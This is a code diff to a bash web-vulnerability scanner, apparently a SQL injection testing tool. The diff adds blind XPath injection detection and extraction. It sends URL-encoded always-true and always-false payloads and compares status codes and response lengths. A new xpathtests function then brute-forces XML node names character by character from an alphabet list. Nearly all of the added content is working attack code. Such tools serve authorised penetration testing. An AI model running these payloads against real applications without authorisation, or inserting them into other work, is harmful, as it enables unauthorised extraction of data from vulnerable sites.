@@ -309,6 +309,10 @@ while [[ $count -lt $columns ]] ; do
 		break 
 	fi
 	let "count+=1"
+	if [[ "$count" == "$columns" ]] ; then
+		echo "" #this adds a new line when order by fails
+		echo "Order By testing failed." 
+	fi
 done
 }
 
@@ -1041,10 +1045,147 @@ fi
 lettergrab
 
 if [[ "$dbms" == "" ]] ; then
-	echo "Could not determine DBMS"	
+	echo "Could not determine DBMS. Testing for XPath injection."	
 fi
+xp=''
+#xpathcheck - numeric params			    #1 or count(parent::*[position()=1])>0
+badparams=`echo "$cleanoutput" | replace "$payload" "%31%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3e%30"`
+#encodeinput=$badparams
+#encodeme
+#badparams=$encodeoutput
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`      #1 or count(parent::*[position()=1])=0
+badparams=`echo "$cleanoutput" | replace "$payload" "%31%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3d%30"`
+#encodeinput=$badparams
+#encodeme
+#badparams=$encodeoutput
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+echo "length_true: $length_true length_false: $length_false"
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	remessage="STATUS DIFF T:$status_true F:$status_false XPATH Injection"
+	echoreporter
+	xp="numeric"
+	xpathtests
+fi
+if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+		remessage="LENGTH DIFF EQUALS $lendiff XPATH Injection"
+		echoreporter
+		xp="numeric"
+		xpathtests
+	fi
+fi
+
+#xpathcheck - string params
+
+#always true:                                       #' or count(parent::*[position()=1])>0 or 'a'='b
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3e%30%20%6f%72%20%27%61%27%3d%27%62"`
+
+#encodeinput=$badparams
+#encodeme
+#badparams=$encodeoutput
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+
+#always false:                                      #' or count(parent::*[position()=1])=0 or 'a'='b
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3d%30%20%6f%72%20%27%61%27%3d%27%62"`
+
+#encodeinput=$badparams
+#encodeme
+#badparams=$encodeoutput
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+echo "length_true: $length_true length_false: $length_false"
+
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	remessage="STATUS DIFF T:$status_true F:$status_false XPATH Injection"
+	echoreporter
+	xp="string"
+	xpathtests
+fi
+if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+		remessage="LENGTH DIFF EQUALS $lendiff XPATH Injection"
+		echoreporter
+		xp="string"
+		xpathtests
+	fi
+fi
+#end of dbms enumeraton if statement
 }
 
+xpathtests()
+{
+rm ./listofxpathnodes.txt 2>/dev/null
+
+#always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
+badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`
+
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+max_position=6
+max_name_length=10
+for nodename in `cat ./payloads/nodenames.txt` ; do
+	position=1
+	if [[ "$nodename" == "child" ]] ; then
+		max_position=6
+	else
+		max_position=2
+	fi		
+	while [[ $position -lt $max_position ]] ; do
+		#echo -n "Node: $nodename Position: $position Node name: "
+		echo ""
+		cflag=1
+		abuf=''
+		while [[ $cflag -lt $max_name_length ]] ; do
+			for i in `cat ./payloads/alphabet.txt` ; do
+				#always true:                                       #' or substring(name($nodename::*[position()=1]),$cflag,1)='$i' or 'a'='b
+				badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$nodename%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d$position%5d%29%2c$cflag%2c%31%29%3d%27$i%27%20%6f%72%20%27%61%27%3d%27%62"`
+				requester
+				status_true=`echo $response | cut -d ":" -f 1`
+				length_true=`echo $response | cut -d ":" -f 2`
+				#echo "...73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c$cflag%2c%31%29%3d%27$i%27%20%6f%72%20%27%61%27%3d%27%62"
+				((lendiff=$length_true-$length_false))
+				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+					echo -n "$i"
+					abuf=$abuf$i
+				fi
+				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+					if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+						echo -n "$i"
+						abuf=$abuf$i
+					fi
+				fi
+			done
+		((cflag=$cflag+1))
+		done
+	remessage="XPATH: Node $nodename Position $position Node name $abuf"
+	echoreporter
+	iu=''
+	if [[ "$nodename" == "child" ]] ; then
+		iu="--"
+	elif [[ "$nodename" == "self" ]] ; then
+		iu="-"
+	elif [[ "$nodename" == "parent" ]] ; then
+		iu=""
+	fi
+
+	echo $iu$abuf >> ./listofxpathnodes.txt
+	((position=$position+1))
+	done
+done
+
+cat ./listofxpathnodes.txt
+}
+	
 lettergrab()
 {
 # adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
@@ -3029,6 +3170,7 @@ rm ./aggoutputlog.txt 2>/dev/null
 
 cp ./alertmessage.txt ./useful.txt
 rm ./alertmessage.txt 2>/dev/null
+rm ./listofxpathnodes.txt 2>/dev/null
 
 echo "Done. HTML report written to ./output/$safelogname-report-$safefilename.html"
 echo "Attempting to open ./output/$safelogname-report-$safefilename.html with firefox"
